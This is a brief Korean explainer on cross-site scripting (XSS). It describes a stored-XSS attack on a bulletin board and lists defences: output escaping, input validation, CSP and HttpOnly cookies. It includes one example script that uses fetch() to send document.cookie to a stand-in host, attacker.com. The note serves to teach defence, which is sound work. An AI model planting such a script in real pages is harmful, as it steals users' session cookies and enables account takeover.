# XSS란
공격자가 악성 스크립트를 웹 페이지에 삽입하여, 자바스크립트를 실행시키는 공격 방식입니다. 
1. 게시판에 글 작성 기능이 존재
2. 공격자가 이런 글을 작성하여 올림
    ```html
    <script>
      fetch("https://attacker.com/steal?cookie=" + document.cookie);
    </script>
    ```
3. 다른 사용자가 글을 열면, 브라우저가 저 스크립트를 실행
4. 그 사용자의 세션 쿠키가 공격자 서버로 전송되어, 세션을 탈취

이를 방어하기 위해서는 다음 방법을 사용할 수 있습니다.
### 1. 출력 시 이스케이프
* HTML, JS, CSS, URL에 따라 다르게 인코딩합니다. 
* 예: `<script>` -> `&lt;script&gt;`
### 2. 입력 검증
허용된 값만 통과하도록 개발합니다. 
### 3. 컨텐츠 보안 정책 (CSP, Content-Security-Policy)
* 외부 스크립트 제한 및 `eval` 금지
* 예: `Content-Security-Policy: default-src 'self'`
### 4. HttpOnly 쿠키
* JS에서 쿠키 접근이 불가하도록 하여, 쿠키 탈취를 방지합니다.
* 예: `Set-Cookie: JSESSIONID=abc; HttpOnly; Secure`
